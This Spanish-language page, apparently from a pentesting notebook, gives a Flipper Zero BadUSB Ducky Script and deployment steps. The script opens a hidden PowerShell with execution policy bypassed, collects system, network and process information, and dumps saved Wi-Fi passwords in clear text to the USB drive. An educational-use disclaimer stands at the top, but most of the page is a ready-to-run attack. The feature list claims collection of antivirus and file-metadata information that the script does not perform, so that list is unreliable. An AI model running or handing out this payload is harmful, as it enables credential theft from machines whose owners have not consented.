
# Windows Exfiltration

{% hint style="danger" %}
Este script y sus instrucciones están diseñados para fines educativos y para realizar pruebas en entornos con permiso explícito. El uso no autorizado de estos scripts es ilegal y puede tener consecuencias graves.
{% endhint %}

## <mark style="color:orange;">Repositorio</mark>

Vamos a utilizar el siguiente script en Ducky Script. **E**s un script de prueba de concepto para automatizar la recopilación y exfiltración de datos a través de Flipper Zero configurado como "BadUSB".

{% code title="win\_exfill.txt" %}

```javascript
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 1000

STRING $Drive = Get-PSDrive | Where-Object { $_.Description -eq 'Removable' } | Select-Object -ExpandProperty Root
ENTER
STRING $output = "${Drive}exfil_data.txt"
ENTER

STRING "System Info:`n" | Out-File -FilePath $output -Encoding utf8
ENTER
STRING systeminfo | Out-File -Append -FilePath $output
ENTER
STRING "Network Config:`n" | Out-File -Append -FilePath $output
ENTER
STRING ipconfig /all | Out-File -Append -FilePath $output
ENTER
STRING "Running Processes:`n" | Out-File -Append -FilePath $output
ENTER
STRING tasklist | Out-File -Append -FilePath $output
ENTER
STRING "Saved Wi-Fi Passwords:`n" | Out-File -Append -FilePath $output
ENTER

STRING (netsh wlan show profiles) | ForEach-Object {
ENTER
STRING ($_ -split ":")[1].Trim() | Out-File -Append -FilePath $output
ENTER
STRING netsh wlan show profile name="$_" key=clear | Out-File -Append -FilePath $output
ENTER
STRING }
ENTER

STRING echo "Datos guardados en ${Drive}exfil_data.txt"
ENTER

```

{% endcode %}

## <mark style="color:orange;">Información</mark>

🖥️ **Recopilación de información del sistema:** Detalles de la computadora, usuarios locales, revisiones instaladas y software antivirus.

📶 **Recopilación de datos de la red:** Perfiles WiFi con contraseñas, configuraciones IPv4, conexiones TCP.

📂 **Extracción de metadatos de archivos**: Recopila información sobre archivos como `.docx`,`.pdf`,`.jpg`, etc.

💾 **Exfiltración automatizada**: Guarda los datos recopilados en una carpeta con nombre dinámico en la unidad USB.

## <mark style="color:orange;">Requisitos</mark>

* **Flipper Zero + Momentum Firmware**
* El sistema de destino debe tener PowerShell habilitado

## <mark style="color:orange;">Ejecución</mark>

1. **Añade a tu Flipper Zero** :
   * Coloque el archivo de script ( w`in_wxfill.txt`) en la carpeta **Bad USB** en su Flipper Zero.
2. **Conectar el Flipper Zero** :
   * Conecte el Flipper Zero al sistema de destino (con permiso).
3. **Ejecutar** :
   * El script se ejecuta automáticamente y guarda los datos recopilados en el archivo img de almacenamiento masivo. Espere a que finalice el proceso y expulse la unidad de forma segura.
